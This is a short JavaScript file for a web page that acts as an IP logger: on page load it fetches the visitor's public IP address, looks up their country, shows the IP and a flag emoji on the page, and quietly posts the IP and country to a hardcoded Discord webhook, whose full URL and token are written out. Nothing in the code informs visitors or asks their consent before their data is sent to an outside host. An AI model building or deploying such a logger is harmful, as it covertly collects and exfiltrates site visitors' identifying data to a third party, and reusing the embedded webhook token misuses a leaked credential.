// Discord webhook URL
const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd";

// Function to fetch the user's IP address
async function fetchIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

// Function to fetch the country and country code based on the IP address
async function fetchCountry(ip) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    return {
      country: data.country_name,
      countryCode: data.country_code,
    };
  } catch (error) {
    console.error("Error fetching country:", error);
    return {
      country: "Unknown",
      countryCode: "XX", // Default country code for unknown
    };
  }
}

// Function to get the country flag emoji
function getCountryFlagEmoji(countryCode) {
  // Convert country code to flag emoji
  return String.fromCodePoint(...[...countryCode.toUpperCase()].map((char) => 0x1f1a5 + char.charCodeAt(0)));
}

// Function to send data to Discord webhook
async function sendToDiscord(ip, country, flag) {
  const data = {
    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}`,
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    console.log("Data sent to Discord successfully!");
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

// Main function to fetch IP, country, flag, and display/send data
async function main() {
  const ip = await fetchIP();
  if (ip) {
    const { country, countryCode } = await fetchCountry(ip);
    const flag = getCountryFlagEmoji(countryCode);

    // Display the IP address and flag on the webpage
    document.getElementById("ip-address").textContent = ip;
    document.getElementById("country-flag").textContent = flag;

    // Send IP, country, and flag to Discord
    await sendToDiscord(ip, country, flag);
  } else {
    document.getElementById("ip-address").textContent = "Failed to fetch IP.";
  }
}

// Run the main function when the page loads
document.addEventListener("DOMContentLoaded", main);
